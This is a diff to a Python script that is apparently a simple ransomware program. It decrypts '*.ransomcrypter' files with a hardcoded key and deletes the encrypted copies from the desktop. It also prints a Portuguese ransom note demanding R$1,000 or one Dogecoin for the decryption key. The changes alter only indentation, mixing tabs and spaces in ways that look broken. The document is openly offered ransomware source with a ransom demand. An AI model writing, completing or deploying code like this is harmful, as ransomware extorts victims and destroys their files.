@@ -53,8 +53,7 @@ def criptografando():
 def descrypt(decrypt_file):
     try:
         for file in glob.glob('*.ransomcrypter'):
-
-            keybytes = decrypt_file.encode()
+			keybytes = decrypt_file.encode()
             name_file = open(file, 'rb')
             file_data = name_file.read()
             dkey = keybytes  # 16 bytes key - change for your key
@@ -73,13 +72,13 @@ def descrypt(decrypt_file):
 if __name__ == '__main__':
     criptografando()
     if criptografando:
-				print('Seu PC foi criptografado, agora você precisa pagar R$ 1,000 reais para receber a chave de decriptografia.\
-            O valor para decriptografar é : 1 Doge coin')
+		print('Seu PC foi criptografado, agora você precisa pagar R$ 1,000 reais para receber a chave de decriptografia.\
+        O valor para decriptografar é : 1 Doge coin')
         key = input('Seu PC foi criptografado informe a chave  para liberar os arquivos:')
         if key == '1ab2c3e4f5g6h7i8':
             descrypt(key)
             for del_file in glob.glob('*.ransomcrypter'):
-                os.remove(f'{desktop}\\{del_file}')
+        		os.remove(f'{desktop}\\{del_file}')
         else:
             print('Chave de liberação inválida!!!')
             
